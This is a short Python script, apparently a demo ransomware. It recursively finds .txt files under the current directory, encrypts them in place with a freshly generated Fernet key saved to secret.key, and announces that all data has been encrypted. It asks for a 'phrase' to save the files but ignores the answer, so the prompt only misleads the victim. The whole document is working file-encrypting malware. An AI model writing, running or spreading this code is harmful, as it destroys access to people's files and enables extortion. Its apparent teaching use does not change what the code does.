import os
from cryptography.fernet import Fernet

def encryption(key,file_list):
    fernet = Fernet(key)
    for file in file_list:
        if file in ['secret.key', 'ransomeware.py', 'ransome_decrypt.py', 'demo2.py']:
            continue
        with open(file,'r') as f:
            file_data = f.read()
        encrypt_data = fernet.encrypt(file_data.encode())
        with open(file,'wb') as f:
            f.write(encrypt_data)



cwd= os.getcwd()
file_list=[]
for root,dirs, files in os.walk(cwd):
    for file in files:
        if file.endswith('.txt'):
            file_list.append(os.path.join(root,file))



key = Fernet.generate_key()
with open("secret.key", "wb") as file:
    file.write(key)
    
prompt = input("Enter the phrase correctly if you want to safe your files: ")
encryption(key,file_list)
print("//////////////////////////////////////////////////////////")
print("//////////////////////////////////////////////////////////")
print("//////////////////////////////////////////////////////////")
print("////////// Successfully Encrypted all your data !! ///////")
print("//////////////////////////////////////////////////////////")
print("//////////////////////////////////////////////////////////")
print("/////////////////////////////////////////////////////////")
